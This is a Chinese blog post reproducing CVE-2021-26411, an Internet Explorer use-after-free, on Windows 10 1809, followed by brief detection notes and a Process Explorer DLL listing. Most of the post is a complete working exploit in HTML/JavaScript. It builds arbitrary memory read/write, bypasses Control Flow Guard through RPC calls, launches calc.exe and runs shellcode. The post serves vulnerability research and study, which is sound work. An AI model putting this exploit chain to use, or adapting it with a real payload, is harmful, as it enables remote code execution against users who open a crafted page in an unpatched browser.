# windows 10 下复现 CVE-2021-26411 漏洞和检测分析 - bonelee - 博客园

> 原文：[`www.cnblogs.com/bonelee/p/17364691.html`](https://www.cnblogs.com/bonelee/p/17364691.html)

# CVE-2021-26411 复现,学习 JavaScript 之 POC 源码分析

## 概述

**CVE-2021-26411**，该漏洞的原因：`removeAttributeNode()`触发属性对象 nodeValue 的 valueOf 回调，回调期间手动调用`clearAttributes()`，导致**nodeValue**保存的 BSTR 被提前释放。回调返回后，没有检查**nodeValue**是否存在继续使用该对象，最终导致**UAF(Use After Free)**。

参考分析链接

国内链接

[CVE-2021-26411 在野样本中利用 RPC 绕过 CFG 缓解技术的研究 (qq.com)](https://mp.weixin.qq.com/s?__biz=MzI4NjE2NjgxMQ==&mid=2650252659&idx=2&sn=a84fc8dc2f3f2cf320bbe5d172a2b37a&chksm=f3e21f07c4959611d6f90dd7ead70da6c4d67bfe930e14106833982d4ee7c6835279444c48ae&scene=27#wechat_redirect)

[IE 浏览器在野 0Day CVE-2021-26411 漏洞分析 (qq.com)](https://mp.weixin.qq.com/s?__biz=MzI4NjE2NjgxMQ==&mid=2650250070&idx=1&sn=5906feea0cfe498bffbb961e73f5c285)

原作者链接

[`enki.co.kr/blog/2021/02/04/ie_0day.html`](https://enki.co.kr/blog/2021/02/04/ie_0day.html)

## 平台环境

Win10 1809 17763  ==》 下载地址：https://hellowindows.cn/

商业-批量版 64 位 2019-09-17 发布

Windows 10 (business editions), version 1809 (updated Sept 2019) (x64) - DVD (Chinese-Simplified)

ED2K

* * *

文件：cn_windows_10_business_editions_version_1809_updated_sept_2019_x64_dvd_f873d037.iso  我是下载的这个版本复现
大小：5.07GB
SHA1：975f1b3acbeece56b5ad1526345a0657109f4043

VmWare 16.1.1 build-17801498

复现效果展示

![](img/6e996111ff62587b0dc09a488bd3eb03.png)

## POC 源码

```
<!-- IE Double Free 1Day Poc -->
<!doctype html>
<html lang="zh-cmn-Hans">
<head>
<meta http-equiv="Cache-Control" content="no-cache">
</head>
<body>
<script language="javascript">

// 重复字符串
String.prototype.repeat = function (size) { return new Array(size + 1).join(this) }

function pad0(str) {
    // 提取倒数第四个字符开始的字符串，效果就是补 0
    return ('0000' + str).slice(-4)
}

// Access of Resource Using Incompatible Type ('Type Confusion')
function alloc1() {
    // DataView 视图是一个可以从 二进制 ArrayBuffer 对象中读写多种数值类型的底层接口，使用它时，不用考虑不同平台的字节序问题。
    var view = new DataView(abf)
    var str = ''
    for (var i = 4; i < abf.byteLength - 2; i += 2)
        str += '%u' + pad0(view.getUint16(i, true).toString(16))
    // 创建并返回一个新的属性节点
    var result = document.createAttribute('alloc')
    // 对 escape()编码的字符串进行解码
    result.nodeValue = unescape(str)
    return result
}

function alloc2() {
    // 创建字典对象
    var dic1 = new ActiveXObject('Scripting.Dictionary')
    var dic2 = new ActiveXObject('Scripting.Dictionary')
    // 增加新项，dic.add(key,value)
    dic2.add(0, 1)
    dic1.add(0, dic2.items())
    dic1.add(1, fake)
    dic1.add(2, arr)
    for (i = 3; i < 0x20010 / 0x10; ++i)
        dic1.add(i, 0x12341234)
    return dic1.items()
}

function dump(nv) {
    // ArrayBuffer 对象用来表示通用的、固定长度的原始二进制数据缓冲区。
    // 创建一个 0x20010 字节的缓冲区，并使用一个 DataView 来引用它
    var ab = new ArrayBuffer(0x20010)
    var view = new DataView(ab)
    for (var i = 0; i < nv.length; ++i)
        view.setUint16(i * 2 + 4, nv.charCodeAt(i), true)
    return ab
}

// 在原型对象上定义属性
function Data(type, value) {
    this.type = type
    this.value = value
}

function setData(i, data) {
    var arr = new Uint32Array(abf)
    arr[i * 4] = data.type
    arr[i * 4 + 2] = data.value
}

function flush() {
    hd1.nodeValue = (new alloc1()).nodeValue
    hd2.nodeValue = 0
    // 返回调用该方法的节点的一个副本.
    hd2 = hd1.cloneNode()
}

// 小端序读取
function read(addr, size) {
    switch (size) {
        case 8:
            return god.getUint8(addr)
        case 16:
            // getUint16(byteOffset [, littleEndian])
            return god.getUint16(addr, true)
        case 32:
            return god.getUint32(addr, true)
    }
}

function write(addr, value, size) {
    switch (size) {
        case 8:
            return god.setUint8(addr, value)
        case 16:
            return god.setUint16(addr, value, true)
        case 32:
            return god.setUint32(addr, value, true)
    }
}

function writeData(addr, data) {
    for (var i = 0; i < data.length; ++i)
        write(addr + i, data[i], 8)
}

function addrOf(obj) {
    arr[0] = obj
    return read(pArr, 32)
}

function strcmp(str1, str2) {
    // typeof 操作符返回一个字符串，表示未经计算的操作数的类型。
    str1 = (typeof str1 == 'string') ? str1 : toStr(str1)
    str2 = (typeof str2 == 'string') ? str2 : toStr(str2)
    return str1.toLowerCase() == str2.toLowerCase()
}

function memcpy(dst, src, size) {
    for (var i = 0; i < size; ++i)
        write(dst + i, read(src + i, 8), 8)
}

function toStr(addr) {
    var str = ''
    while (true) {
        var c = read(addr, 8)
        // 遇到终结符就退出循环
        if (c == 0) break
        // 返回由指定的 UTF-16 代码单元序列创建的字符串
        str += String.fromCharCode(c)
        addr++
    }
    return str
}

function newStr(str) {
    var buffer = createArrayBuffer(str.length + 1)
    for (var i = 0; i < str.length; ++i) write(buffer + i, str.charCodeAt(i), 8)
    // 写入字符串终结符
    write(buffer + i, 0, 8)
    return buffer
}
// PE 文件相关操作函数
function getDllBase(base, name) {
    var tmpValue = 0
    var index = 0
    var iat = base + read(base + read(base + 60, 32) + 128, 32)
    while (true) {
        var offset = read(iat + index * 20 + 12, 32)
        if (strcmp(base + offset, name)) break
        index++
    }
    var addr = read(iat + index * 20 + 16, 32)
    return getBase(read(base + addr, 32))
}

function getBase(addr) {
    var addr = addr & 0xffff0000
    while (true) {
        if (isMZ(addr) && isPE(addr)) break
        addr -= 0x10000
    }
    return addr
}

function isMZ(addr) {
    return read(addr, 16) == 0x5a4d
}

function isPE(addr) {
    var sizeOfHeaders = read(addr + 60, 32)
    if (sizeOfHeaders > 0x600) return null
    var addr = addr + sizeOfHeaders
    if (read(addr, 32) != 0x4550) return null
    return addr
}

function winVer() {
    // 返回浏览器的平台和版本信息
    var appVersion = window.navigator.appVersion
    var ver = 0
    // 检测一个字符串是否匹配某个模式，javaScript 正则表达式
    if (/(Windows 10.0|Windows NT 10.0)/.test(appVersion)) {
        ver = 100
    } else if (/(Windows 8.1|Windows NT 6.3)/.test(appVersion)) {
        ver = 81
    } else if (/(Windows 8|Windows NT 6.2)/.test(appVersion)) {
        ver = 80
    } else {
        ver = 70
    }
    return ver
}

function createArrayBuffer(size) {
    var ab = new ArrayBuffer(size)
    var bs = read(addrOf(ab) + 0x1c, 32)
    // 设置键值对
    map.set(bs, ab)
    return bs
}

function getProcAddr(addr, name) {
    var eat = addr + read(addr + read(addr + 0x3c, 32) + 0x78, 32)
    var non = read(eat + 0x18, 32)
    var aof = addr + read(eat + 0x1c, 32)
    var aon = addr + read(eat + 0x20, 32)
    var aono = addr + read(eat + 0x24, 32)
    for (var i = 0; i < non; ++i) {
        var offset = read(aon + i * 4, 32)
        if (strcmp(addr + offset, name)) break
    }
    var offset = read(aono + i * 2, 16)
    return addr + read(aof + offset * 4, 32)
}

function readyRpcCall(func) {
    var PRPC_CLIENT_INTERFACE_Buffer = _RPC_MESSAGE.get(msg, 'RpcInterfaceInformation')
    var _MIDL_SERVER_INFO_Buffer = PRPC_CLIENT_INTERFACE.get(PRPC_CLIENT_INTERFACE_Buffer, 'InterpreterInfo')
    var RPC_DISPATCH_TABLE_Buffer = _MIDL_SERVER_INFO_.get(_MIDL_SERVER_INFO_Buffer, 'DispatchTable')
    write(RPC_DISPATCH_TABLE_Buffer, func, 32)
}

function setArgs(args) {
    var buffer = createArrayBuffer(48)
    for (var i = 0; i < args.length; ++i) {
        write(buffer + i * 4, args[i], 32)
    }
    _RPC_MESSAGE.set(msg, 'Buffer', buffer)
    _RPC_MESSAGE.set(msg, 'BufferLength', 48)
    _RPC_MESSAGE.set(msg, 'RpcFlags', 0x1000)
    return buffer
}

function callRpcFreeBufferImpl() {
    var buffer = _RPC_MESSAGE.get(msg, 'Buffer')
    _RPC_MESSAGE.set(rpcFree, 'Buffer', buffer)
    return call(rpcFree)
}

function callRpcFreeBuffer() {
    var buffer = _RPC_MESSAGE.get(msg, 'Buffer')
    var result = read(buffer, 32)
    callRpcFreeBufferImpl()
    return result
}

function call2(func, args) {
    readyRpcCall(func)
    var buffer = setArgs(args)
    call(msg)
    map.delete(buffer)
    return callRpcFreeBuffer()
}

function call(addr) {
    var result = 0
    write(paoi + 0x18, addr, 32)
    // 错误处理
    try {
        // rpcrt4!NdrServerCall2
        xyz.normalize()
    } catch (error) {
        result = error.number
    }
    write(paoi + 0x18, patt, 32)
    return result
}

function prepareCall(addr, func) {
    var buf = createArrayBuffer(cattr.size())
    var vft = read(patt, 32)
    memcpy(addr, patt, cbase.size())
    memcpy(buf, vft, cattr.size())
    cbase.set(addr, 'pvftable', buf)
    cattr.set(buf, 'normalize', func)
}

function createBase() {
    var isWin7 = winVer() == 70
    var size = isWin7 ? 560 : 572
    var offset = isWin7 ? 540 : 548
    var addr1 = createArrayBuffer(size + cbase.size())
    var addr2 = createArrayBuffer(48)
    write(addr1 + offset, addr2, 32)
    write(addr2 + 40, 8, 32)
    write(addr2 + 36, 8, 32)
    return {
        size: size,
        addr: addr1
    }
}

function aos() {
    var baseObj = createBase()
    var addr = baseObj.addr + baseObj.size
    var I_RpcTransServerNewConnection = getProcAddr(rpcrt4, 'I_RpcTransServerNewConnection')
    prepareCall(addr, I_RpcTransServerNewConnection)
    return read(read(call(addr)-0xf8, 32), 32)
}

// 自定义结构体的操作
function SymTab(size, sym) {
    this.size = function() {
        return size
    }
    this.set = function(addr, name, value) {
        var o = sym[name]
        write(addr + o.offset, value, o.size)
    }
    this.get = function(addr, name) {
        var o = sym[name]
        return read(addr + o.offset, o.size)
    }
}

// 构造 RPC
function initRpc() {
    var data = [50,72,0,0,0,0,0,0,52,0,192,0,16,0,68,13,10,1,0,0,0,0,0,0,0,0,72,0,0,0,9,0,72,0,4,0,9,0,72,0,8,0,9,0,72,0,12,0,9,0,72,0,16,0,9,0,72,0,20,0,9,0,72,0,24,0,9,0,72,0,28,0,9,0,72,0,32,0,9,0,72,0,36,0,9,0,72,0,40,0,9,0,72,0,44,0,9,0,112,0,48,0,9,0,0]
    var NdrServerCall2 = getProcAddr(rpcrt4, 'NdrServerCall2')
    var NdrOleAllocate = getProcAddr(rpcrt4, 'NdrOleAllocate')
    var NdrOleFree = getProcAddr(rpcrt4, 'NdrOleFree')
    var RPCMessageObject = createArrayBuffer(cbase.size())
    var buffer = createArrayBuffer(0x100)
    var buffer2 = createArrayBuffer(0x200)
    var AttributeVtable = read(patt, 32)
    var MSHTMLSymbolBuffer = createArrayBuffer(0x1000)
    var TransferSyntaxBuffer = createArrayBuffer(syntaxObject.size())
    var PRPC_CLIENT_INTERFACE_Buffer = createArrayBuffer(PRPC_CLIENT_INTERFACE.size())
    var _MIDL_SERVER_INFO_Buffer = createArrayBuffer(_MIDL_SERVER_INFO_.size())
    var rpcProcStringBuffer = createArrayBuffer(data.length)
    writeData(rpcProcStringBuffer, data)
    var _MIDL_STUB_DESC_Buffer = createArrayBuffer(_MIDL_STUB_DESC.size())
    var RPC_DISPATCH_TABLE_Buffer = createArrayBuffer(RPC_DISPATCH_TABLE.size())
    var NdrServerCall2Buffer = createArrayBuffer(4)
    write(NdrServerCall2Buffer, NdrServerCall2, 32)
    write(MSHTMLSymbolBuffer, osf_vft, 32)
    write(MSHTMLSymbolBuffer + 4, 0x89abcdef, 32)
    write(MSHTMLSymbolBuffer + 8, 0x40, 32)
    cattr.set(MSHTMLSymbolBuffer, '__vtguard', cattr.get(AttributeVtable, '__vtguard'))
    cattr.set(MSHTMLSymbolBuffer, 'SecurityContext', cattr.get(AttributeVtable, 'SecurityContext'))
    cattr.set(MSHTMLSymbolBuffer, 'JSBind_InstanceOf', cattr.get(AttributeVtable, 'JSBind_InstanceOf'))
    cattr.set(MSHTMLSymbolBuffer, 'JSBind_TypeId', cattr.get(AttributeVtable, 'JSBind_TypeId'))
    cattr.set(MSHTMLSymbolBuffer, 'normalize', NdrServerCall2)
    cbase.set(RPCMessageObject, 'pSecurityContext', RPCMessageObject + 68)
    write(RPCMessageObject + 76, 1, 32)
    syntaxObject.set(TransferSyntaxBuffer, 'SyntaxVersion.MajorVersion', 2)
    _MIDL_STUB_DESC.set(_MIDL_STUB_DESC_Buffer, 'RpcInterfaceInformation', PRPC_CLIENT_INTERFACE_Buffer)
    _MIDL_STUB_DESC.set(_MIDL_STUB_DESC_Buffer, 'pfnAllocate', NdrOleAllocate)
    _MIDL_STUB_DESC.set(_MIDL_STUB_DESC_Buffer, 'pfnFree', NdrOleFree)
    _MIDL_STUB_DESC.set(_MIDL_STUB_DESC_Buffer, 'pFormatTypes', buffer2)
    _MIDL_STUB_DESC.set(_MIDL_STUB_DESC_Buffer, 'fCheckBounds', 1)
    _MIDL_STUB_DESC.set(_MIDL_STUB_DESC_Buffer, 'Version', 0x50002)
    _MIDL_STUB_DESC.set(_MIDL_STUB_DESC_Buffer, 'MIDLVersion', 0x800025b)
    _MIDL_STUB_DESC.set(_MIDL_STUB_DESC_Buffer, 'mFlags', 1)
    _MIDL_SERVER_INFO_.set(_MIDL_SERVER_INFO_Buffer, 'pStubDesc', _MIDL_STUB_DESC_Buffer)
    _MIDL_SERVER_INFO_.set(_MIDL_SERVER_INFO_Buffer, 'DispatchTable', createArrayBuffer(32))
    _MIDL_SERVER_INFO_.set(_MIDL_SERVER_INFO_Buffer, 'ProcString', rpcProcStringBuffer)
    _MIDL_SERVER_INFO_.set(_MIDL_SERVER_INFO_Buffer, 'FmtStringOffset', buffer2)
    RPC_DISPATCH_TABLE.set(RPC_DISPATCH_TABLE_Buffer, 'DispatchTableCount', 1)
    RPC_DISPATCH_TABLE.set(RPC_DISPATCH_TABLE_Buffer, 'DispatchTable', NdrServerCall2Buffer)
    PRPC_CLIENT_INTERFACE.set(PRPC_CLIENT_INTERFACE_Buffer, 'DispatchTable', RPC_DISPATCH_TABLE_Buffer)
    PRPC_CLIENT_INTERFACE.set(PRPC_CLIENT_INTERFACE_Buffer, 'InterpreterInfo', _MIDL_SERVER_INFO_Buffer)
    PRPC_CLIENT_INTERFACE.set(PRPC_CLIENT_INTERFACE_Buffer, 'Length', PRPC_CLIENT_INTERFACE.size())
    PRPC_CLIENT_INTERFACE.set(PRPC_CLIENT_INTERFACE_Buffer, 'InterfaceId.SyntaxVersion.MajorVersion', 1)
    PRPC_CLIENT_INTERFACE.set(PRPC_CLIENT_INTERFACE_Buffer, 'TransferSyntax.SyntaxVersion.MajorVersion', 2)
    PRPC_CLIENT_INTERFACE.set(PRPC_CLIENT_INTERFACE_Buffer, 'Flags', 0x4000000)
    _RPC_MESSAGE.set(RPCMessageObject, 'RpcInterfaceInformation', PRPC_CLIENT_INTERFACE_Buffer)
    _RPC_MESSAGE.set(RPCMessageObject, 'TransferSyntax', TransferSyntaxBuffer)
    _RPC_MESSAGE.set(RPCMessageObject, 'Handle', MSHTMLSymbolBuffer)
    _RPC_MESSAGE.set(RPCMessageObject, 'DataRepresentation', 16)
    _RPC_MESSAGE.set(RPCMessageObject, 'RpcFlags', 0x1000)
    _RPC_MESSAGE.set(RPCMessageObject, 'Buffer', buffer)
    _RPC_MESSAGE.set(RPCMessageObject, 'BufferLength', 48)
    return RPCMessageObject
}

function rpcFree() {
    var Cbase = createArrayBuffer(cbase.size())
    var I_RpcFreeBuffer = getProcAddr(rpcrt4, 'I_RpcFreeBuffer')
    var MSHTMLSymbolBuffer = createArrayBuffer(0x1000)
    var AttributeVtable = read(patt, 32)
    write(MSHTMLSymbolBuffer, osf_vft, 32)
    write(MSHTMLSymbolBuffer + 4, 0x89abcdef, 32)
    write(MSHTMLSymbolBuffer + 8, 64, 32)
    cattr.set(MSHTMLSymbolBuffer, '__vtguard', cattr.get(AttributeVtable, '__vtguard'))
    cattr.set(MSHTMLSymbolBuffer, 'SecurityContext', cattr.get(AttributeVtable, 'SecurityContext'))
    cattr.set(MSHTMLSymbolBuffer, 'JSBind_InstanceOf', cattr.get(AttributeVtable, 'JSBind_InstanceOf'))
    cattr.set(MSHTMLSymbolBuffer, 'JSBind_TypeId', cattr.get(AttributeVtable, 'JSBind_TypeId'))
    cattr.set(MSHTMLSymbolBuffer, 'normalize', I_RpcFreeBuffer)
    cbase.set(Cbase, 'pvftable', MSHTMLSymbolBuffer)
    cbase.set(Cbase, 'pSecurityContext', Cbase + 68)
    write(Cbase + 76, 1, 32)
    return Cbase
}

function CFGObject(baseAddress) {
    var PEAddr = isPE(baseAddress)
    var eat = PEAddr + 120
    var LOAD_CONFIG_DIRECTORY = baseAddress + read(eat + 0x50, 32)
    var size = read(LOAD_CONFIG_DIRECTORY, 32)
    var sizeOfImage = read(PEAddr + 0x50, 32)
    var CFGSymbolTable = new SymTab(0x5c, {
        '___guard_check_icall_fptr': {
            offset: 72,
            size: 32
        }
    })

    var guard_check_icall_fptr_address = size < CFGSymbolTable.size() ? 0 : CFGSymbolTable.get(LOAD_CONFIG_DIRECTORY, '___guard_check_icall_fptr')
    this.getCFGAddress = function() {
        return guard_check_icall_fptr_address
    }
    this.getCFGValue = function() {
        if (size < CFGSymbolTable.size()) return false
        var currentCFGValue = read(guard_check_icall_fptr_address, 32)
        var isValidAddress = (baseAddress < currentCFGValue) && (currentCFGValue < baseAddress + sizeOfImage)
        return !isValidAddress;
    }
}

function killCfg(addr) {
    var cfgobj = new CFGObject(addr)
    if (!cfgobj.getCFGValue()) return
    var guard_check_icall_fptr_address = cfgobj.getCFGAddress()
    var KiFastSystemCallRet = getProcAddr(ntdll, 'KiFastSystemCallRet')
    var tmpBuffer = createArrayBuffer(4)
    // 修改 RPCRT4!__guard_check_icall_fptr 的属性为 PAGE_EXECUTE_READWRITE
    call2(VirtualProtect, [guard_check_icall_fptr_address, 0x1000, 0x40, tmpBuffer])
    // 替换 rpcrt4!__guard_check_icall_fptr 保存的指针，修改 ntdll!LdrpValidateUserCallTarget 为改为 ntdll!KiFastSystemCallRet
    // 关闭 rpcrt4 的 CFG 检查
    write(guard_check_icall_fptr_address, KiFastSystemCallRet, 32)
    // 恢复 PRCRT4!__gurad_check_icall_fptr 内存属性
    call2(VirtualProtect, [guard_check_icall_fptr_address, 0x1000, read(tmpBuffer, 32), tmpBuffer])
    map.delete(tmpBuffer)
}

// {} 表示对象
// 属性：属性值
var cbase = new SymTab(0x60, {
    'pvftable': {
        offset: 0x0,
        size: 32
    },
    'pSecurityContext': {
        offset: 0x44,
        size: 32
    }
})

var cattr = new SymTab(0x32c, {
    '__vtguard': {
        offset: 0x48,
        size: 32
    },
    'SecurityContext': {
        offset: 0xc8,
        size: 32
    },
    'JSBind_TypeId': {
        offset: 0x160,
        size: 32
    },
    'JSBind_InstanceOf': {
        offset: 0x164,
        size: 32
    },
    'normalize': {
        offset: 0x28c,
        size: 32
    }
})

var syntaxObject = new SymTab(0x14, {
    'SyntaxVersion.MajorVersion': {
        offset: 0x10,
        size: 16
    }
})

var PRPC_CLIENT_INTERFACE = new SymTab(0x44, {
    'Length': {
        offset: 0,
        size: 32
    },
    'InterfaceId.SyntaxVersion.MajorVersion': {
        offset: 20,
        size: 16
    },
    'TransferSyntax.SyntaxVersion.MajorVersion': {
        offset: 40,
        size: 16
    },
    // 保存了 runtime 库和 Stub 函数的接口指针
    'DispatchTable': {
        offset: 44,
        size: 32
    },
    // 指向 MIDL_SERVER_INFO 结构
    'InterpreterInfo': {
        offset: 60,
        size: 32
    },
    'Flags': {
        offset: 64,
        size: 32
    }
})

// 保存了服务端 IDL 接口信息
var _MIDL_SERVER_INFO_ = new SymTab(0x20, {
    'pStubDesc': {
        offset: 0,
        size: 32
    },
    // 保存了服务端提供的远程调用例程的函数指针数组
    'DispatchTable': {
        offset: 4,
        size: 32
    },
    'ProcString': {
        offset: 8,
        size: 32
    },
    'FmtStringOffset': {
        offset: 12,
        size: 32
    }
})

var _MIDL_STUB_DESC = new SymTab(0x50, {
    'RpcInterfaceInformation': {
        offset: 0,
        size: 32
    },
    'pfnAllocate': {
        offset: 4,
        size: 32
    },
    'pfnFree': {
        offset: 8,
        size: 32
    },
    'pFormatTypes': {
        offset: 32,
        size: 32
    },
    'fCheckBounds': {
        offset: 36,
        size: 32
    },
    'Version': {
        offset: 40,
        size: 32
    },
    'MIDLVersion': {
        offset: 48,
        size: 32
    },
    'mFlags': {
        offset: 64,
        size: 32
    }
})

var RPC_DISPATCH_TABLE = new SymTab(12, {
    'DispatchTableCount': {
        offset: 0,
        size: 32
    },
    'DispatchTable': {
        offset: 4,
        size: 32
    },
})

var _RPC_MESSAGE = new SymTab(0x2c, {
    'Handle': {
        offset: 0,
        size: 32
    },
    'DataRepresentation': {
        offset: 4,
        size: 32
    },
    // 存放函数的参数
    'Buffer': {
        offset: 8,
        size: 32
    },
    'BufferLength': {
        offset: 12,
        size: 32
    },
    'TransferSyntax': {
        offset: 20,
        size: 32
    },
    // 指向 RPC_SERVER_INTERFACE 
    'RpcInterfaceInformation': {
        offset: 24,
        size: 32
    },
    'RpcFlags': {
        offset: 40,
        size: 32
    }
})

var god
// 对象数组
var arr = [{}]
var fake = new ArrayBuffer(0x100)
var abf = new ArrayBuffer(0x20010)
var alloc = alloc2()
// 创建一个 HTML 属性对象
var hd0 = document.createAttribute('handle')
var hd1 = document.createAttribute('handle')
var hd2
// 创建一个 HTML 元素对象
var ele = document.createElement('element')
var att = document.createAttribute('attribute')
att.nodeValue = {
    valueOf: function() {
        hd1.nodeValue = (new alloc1()).nodeValue
        // 回调时，清除 ele 对象绑定的所有属性
        ele.clearAttributes()
        hd2 = hd1.cloneNode()
        ele.setAttribute('attribute', 1337)
    }
}
ele.setAttributeNode(att)
ele.setAttribute('attr', '0'.repeat((0x20010 - 6) / 2))
// 触发 valueof 函数回调
ele.removeAttributeNode(att)
hd0.nodeValue = alloc
var leak = new Uint32Array(dump(hd2.nodeValue))
var pAbf = leak[6]
var pArr = leak[10]
var VT_I4 = 0x3
var VT_DISPATCH = 0x9
var VT_BYREF = 0x4000
var bufArr = new Array(0x10)
var fakeArr = new Uint32Array(fake)
for (var i = 0; i < 0x10; ++i) setData(i + 1, new Data(VT_BYREF | VT_I4, pAbf + i * 4))
flush()
var ref = new VBArray(hd0.nodeValue)
for (var i = 0; i < 0x10; ++i) bufArr[i] = ref.getItem(i + 1)
ref = null
setData(1, new Data(VT_BYREF | VT_I4, bufArr[4]))
setData(2, new Data(VT_BYREF | VT_I4, bufArr[4] + 0x04))
setData(3, new Data(VT_BYREF | VT_I4, bufArr[4] + 0x1c))
flush()
ref = new VBArray(hd0.nodeValue)
var vt = ref.getItem(1)
var gc = ref.getItem(2)
var bs = ref.getItem(3)
ref = null
for (var i = 0; i < 16; ++i) fakeArr[i] = bufArr[i]
fakeArr[4] = bs + 0x40
fakeArr[16] = vt
fakeArr[17] = gc
fakeArr[24] = 0xffffffff
setData(1, new Data(VT_DISPATCH, bs))
flush()
ref = new VBArray(hd0.nodeValue)
god = new DataView(ref.getItem(1))
ref = null
pArr = read(read(pArr + 0x10, 32) + 0x14, 32) + 0x10
write(read(addrOf(hd0) + 0x18, 32) + 0x28, 0, 32)

var map = new Map()
var jscript9 = getBase(read(addrOf(map), 32))
var rpcrt4 = getDllBase(jscript9, 'rpcrt4.dll')
var msvcrt = getDllBase(jscript9, 'msvcrt.dll')
var ntdll = getDllBase(msvcrt, 'ntdll.dll')
var kernelbase = getDllBase(msvcrt, 'kernelbase.dll')
var VirtualProtect = getProcAddr(kernelbase, 'VirtualProtect')
var LoadLibraryExA = getProcAddr(kernelbase, 'LoadLibraryExA')
var xyz = document.createAttribute('xyz')
var paoi = addrOf(xyz)
var patt = read(addrOf(xyz) + 0x18, 32)
var osf_vft = aos()
var msg = initRpc()
var rpcFree = rpcFree()
killCfg(rpcrt4)

// 调用 API,弹出计算器
var kernel32 = call2(LoadLibraryExA,[newStr('kernel32.dll',0,1)])
var WinExec = getProcAddr(kernel32,'WinExec')
call2(WinExec,[newStr('calc.exe'),5])

// 调用 shellcode
var shellcode = new Uint8Array([0xb8, 0x37, 0x13, 0x00, 0x00, 0xc3])
var msi = call2(LoadLibraryExA, [newStr('msi.dll'), 0, 1]) + 0x5000
var tmpBuffer = createArrayBuffer(4)
call2(VirtualProtect, [msi, shellcode.length, 0x4, tmpBuffer])
writeData(msi, shellcode) // mov eax, 0x1337 ; ret
call2(VirtualProtect, [msi, shellcode.length, read(tmpBuffer, 32), tmpBuffer])
var result = call2(msi, [])
// 根据 shellocde 的而反汇编结果，这里会弹出 0x1337 的对话框
alert(result.toString(16))

</script>
</body>
</html>

```

注意细节：我是本地保存 html，然后打开复现的，

C:\Users\bonelee\Desktop\1809.html

![](img/af6643aae2a2075e6c3f9050af3f06eb.png)

如果是放在服务器下运行然后访问，则不会弹出计算器。但是会有弹窗，如下：

![](img/f67e3539ff660da520bb3e5c4b793ef9.png)

我们使用 proc exp 采集下数据：

![](img/911c8e69a7f9ad83e75200dd7e5d0ec1.png)

可以看到 ie 并没有 calc 的自进程！从其加载的 dll 里，可以看到有 mshtml.dll！

![](img/e2e7807c95e51796661fecf03c533409.png)

 可以看到是 svchost 出来的。

![](img/6ac715c1d1a1a03000e4cdba2d6f2351.png)

 我们重点看下 ie 加载的 dll 清单：

```
Process: iexplore.exe Pid: 2280

Name	Description	Company Name	Path
{6AF0698E-D558-4F6E-9B3C-3716689AF493}.2.ver0x0000000000000001.db			C:\ProgramData\Microsoft\Windows\Caches\{6AF0698E-D558-4F6E-9B3C-3716689AF493}.2.ver0x0000000000000001.db
{AFBF9F1A-8EE8-4C77-AF34-C647E37CA0D9}.1.ver0x0000000000000001.db			C:\Users\bonelee\AppData\Local\Microsoft\Windows\Caches\{AFBF9F1A-8EE8-4C77-AF34-C647E37CA0D9}.1.ver0x0000000000000001.db
{DDF571F2-BE98-426D-8288-1A9A39C3FDA2}.2.ver0x0000000000000001.db			C:\ProgramData\Microsoft\Windows\Caches\{DDF571F2-BE98-426D-8288-1A9A39C3FDA2}.2.ver0x0000000000000001.db
advapi32.dll	Advanced Windows 32 Base API	Microsoft Corporation	C:\Windows\SysWOW64\advapi32.dll
apphelp.dll	应用程序兼容性客户端库	Microsoft Corporation	C:\Windows\SysWOW64\apphelp.dll
bcrypt.dll	Windows Cryptographic Primitives Library (Wow64)	Microsoft Corporation	C:\Windows\SysWOW64\bcrypt.dll
bcryptprimitives.dll	Windows Cryptographic Primitives Library	Microsoft Corporation	C:\Windows\SysWOW64\bcryptprimitives.dll
C_1252.NLS			C:\Windows\System32\C_1252.NLS
cfgmgr32.dll	Configuration Manager DLL	Microsoft Corporation	C:\Windows\SysWOW64\cfgmgr32.dll
clbcatq.dll	COM+ Configuration Catalog	Microsoft Corporation	C:\Windows\SysWOW64\clbcatq.dll
combase.dll	Microsoft COM for Windows	Microsoft Corporation	C:\Windows\SysWOW64\combase.dll
comctl32.dll	用户体验控件库	Microsoft Corporation	C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_5.82.17763.737_none_588eeadb78ace734\comctl32.dll
comctl32.dll	用户体验控件库	Microsoft Corporation	C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.17763.737_none_4d637a531b9a7e51\comctl32.dll
comdlg32.dll	Common Dialogs DLL	Microsoft Corporation	C:\Windows\SysWOW64\comdlg32.dll
coml2.dll	Microsoft COM for Windows	Microsoft Corporation	C:\Windows\SysWOW64\coml2.dll
CoreMessaging.dll	Microsoft CoreMessaging Dll	Microsoft Corporation	C:\Windows\SysWOW64\CoreMessaging.dll
CoreUIComponents.dll	Microsoft Core UI Components Dll	Microsoft Corporation	C:\Windows\SysWOW64\CoreUIComponents.dll
crypt32.dll	Crypto API32	Microsoft Corporation	C:\Windows\SysWOW64\crypt32.dll
cryptbase.dll	Base cryptographic API DLL	Microsoft Corporation	C:\Windows\SysWOW64\cryptbase.dll
cryptsp.dll	Cryptographic Service Provider API	Microsoft Corporation	C:\Windows\SysWOW64\cryptsp.dll
cversions.2.db			C:\ProgramData\Microsoft\Windows\Caches\cversions.2.db
cversions.2.db			C:\ProgramData\Microsoft\Windows\Caches\cversions.2.db
d2d1.dll	Microsoft D2D Library	Microsoft Corporation	C:\Windows\SysWOW64\d2d1.dll
d3d11.dll	Direct3D 11 Runtime	Microsoft Corporation	C:\Windows\SysWOW64\d3d11.dll
DataExchange.dll	Data exchange	Microsoft Corporation	C:\Windows\SysWOW64\DataExchange.dll
dcomp.dll	Microsoft DirectComposition Library	Microsoft Corporation	C:\Windows\SysWOW64\dcomp.dll
directmanipulation.dll	Microsoft Direct Manipulation Component	Microsoft Corporation	C:\Windows\SysWOW64\directmanipulation.dll
dwmapi.dll	Microsoft Desktop Window Manager API	Microsoft Corporation	C:\Windows\SysWOW64\dwmapi.dll
DWrite.dll	Microsoft DirectX Typography Services	Microsoft Corporation	C:\Windows\SysWOW64\DWrite.dll
dxgi.dll	DirectX Graphics Infrastructure	Microsoft Corporation	C:\Windows\SysWOW64\dxgi.dll
efswrt.dll	Storage Protection Windows Runtime DLL	Microsoft Corporation	C:\Windows\SysWOW64\efswrt.dll
gdi32.dll	GDI Client DLL	Microsoft Corporation	C:\Windows\SysWOW64\gdi32.dll
gdi32full.dll	GDI Client DLL	Microsoft Corporation	C:\Windows\SysWOW64\gdi32full.dll
ieapfltr.dll	Microsoft SmartScreen Filter	Microsoft Corporation	C:\Windows\SysWOW64\ieapfltr.dll
ieframe.dll	Internet 浏览器	Microsoft Corporation	C:\Windows\SysWOW64\ieframe.dll
